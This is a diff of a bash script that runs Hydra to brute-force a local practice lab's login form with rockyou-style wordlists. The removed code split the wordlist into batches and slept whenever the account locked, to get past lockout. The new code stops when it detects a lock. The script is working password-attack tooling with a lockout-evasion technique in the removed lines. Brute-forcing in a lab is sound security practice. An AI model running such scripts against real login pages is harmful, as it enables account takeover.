@@ -10,16 +10,18 @@ read -p "Enter your choice [1 or 2]: " choice
 
 if [[ "$choice" == "1" ]]; then
     echo "[*] Configuring for SIMPLE website..."
+    # Localhost URL for the curl check
     URL="http://localhost/HydraBruteLab/simple/login.php"
     WORDLIST="rockyou.txt"
-    # We need the path specifically for the Hydra command syntax
+    # Path specifically for the Hydra command syntax
     URL_PATH="/HydraBruteLab/simple/login.php"
     
 elif [[ "$choice" == "2" ]]; then
     echo "[*] Configuring for ADVANCED website..."
+    # Localhost URL for the curl check
     URL="http://localhost/HydraBruteLab/advanced/login.php"
     WORDLIST="pass.txt"
-    # We need the path specifically for the Hydra command syntax
+    # Path specifically for the Hydra command syntax
     URL_PATH="/HydraBruteLab/advanced/login.php"
     
 else
@@ -33,66 +35,52 @@ USER="admin@admin.admin"
 LOCK_MSG="Account temporary locked"
 # The standard failure message (used to define the Hydra command)
 FAIL_MSG="Wrong password"
-# How many attempts before checking (keep this lower than the lock threshold)
-BATCH_SIZE=3
-# How long to sleep (in seconds) if locked
-SLEEP_TIME=60
 
-# ---------------------
-# Check if wordlist exists before starting
+# Check if wordlist exists
 if [ ! -f "$WORDLIST" ]; then
     echo "[!] Error: Wordlist '$WORDLIST' not found!"
     exit 1
 fi
 
-# Create a temporary directory for wordlist chunks
-mkdir -p temp_chunks
-echo "[*] Splitting wordlist ($WORDLIST) into chunks of $BATCH_SIZE..."
-split -l $BATCH_SIZE $WORDLIST temp_chunks/chunk_
+echo "------------------------------------------------"
+echo "[*] Starting Attack on: localhost$URL_PATH"
+echo "------------------------------------------------"
 
-# Loop through each chunk file
-for file in temp_chunks/chunk_*; do
-    
-    # Infinite loop for the current chunk (allows retrying)
-    while true; do
-        echo "[-] Testing batch: $file"
-        
-        # Run Hydra on the current small file
-        # UPDATED: We now use $URL_PATH inside the command string so it matches your selection
-        OUTPUT=$(hydra -l $USER -P $file -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)
-        
-        # CHECK 1: Did we find the password?
-        # Hydra output contains "password:" when successful (and not part of an error message)
-        if echo "$OUTPUT" | grep -q "host: localhost"; then
-             echo ""
-             echo "#############################################"
-             echo "[+] SUCCESS FOUND!"
-             # Extract the line containing the password
-             echo "$OUTPUT" | grep "login:" 
-             echo "#############################################"
-             
-             # Cleanup and Exit
-             rm -rf temp_chunks
-             exit 0
-        fi
+# --- RUN HYDRA (No Chunking) ---
+# We run Hydra once. We capture the output to variable $OUTPUT so we can analyze it.
+# Note: If the account locks during this run, Hydra might report a "False Positive" 
+# (saying it found a password) because the "Wrong password" message disappeared.
+# That is why the Lock Check below is crucial.
 
-        # CHECK 2: Is the account locked?
-        # We probe the server once to check for the lock message.
-        TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)
-        
-        if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
-            echo "[!] DETECTED LOCKOUT! Sleeping for $SLEEP_TIME seconds..."
-            sleep $SLEEP_TIME
-            echo "[*] Resuming..."
-            # The 'while' loop triggers again, retrying this same 'file' (chunk)
-            continue 
-        else
-            # If not locked, and Hydra didn't find the password, move to next chunk
-            break
-        fi
-    done
-done
+OUTPUT=$(hydra -l $USER -P $WORDLIST -t 1 -o /dev/null localhost http-form-post "$URL_PATH:email=^USER^&password=^PASS^&submit=Submit:F=$FAIL_MSG" 2>&1)
 
-# Cleanup
-rm -rf temp_chunks
-echo "[*] Wordlist finished. No password found."
+# --- CHECK FOR LOCKOUT ---
+# As requested: Check strictly if account is locked. If so, STOP.
+# We probe the server manually with curl to see the current status.
+
+TEST_RESP=$(curl -s -d "email=$USER&password=CheckLockStatus&submit=Submit" $URL)
+
+if [[ "$TEST_RESP" == *"$LOCK_MSG"* ]]; then
+    echo ""
+    echo "#############################################"
+    echo "[!] ALERT: ACCOUNT LOCKED OUT!"
+    echo "#############################################"
+    echo "[*] The server is returning: '$LOCK_MSG'"
+    echo "[*] Stopping script immediately as requested."
+    exit 1
+fi
+
+# --- CHECK FOR SUCCESS ---
+# If we are NOT locked out, we check if Hydra actually found the password.
+
+if echo "$OUTPUT" | grep -q "host: localhost"; then
+     echo ""
+     echo "#############################################"
+     echo "[+] SUCCESS FOUND!"
+     # Extract the line containing the password from Hydra output
+     echo "$OUTPUT" | grep "login:" 
+     echo "#############################################"
+     exit 0
+else
+     echo "[-] Attack finished. No password found (and not locked)."
+fi
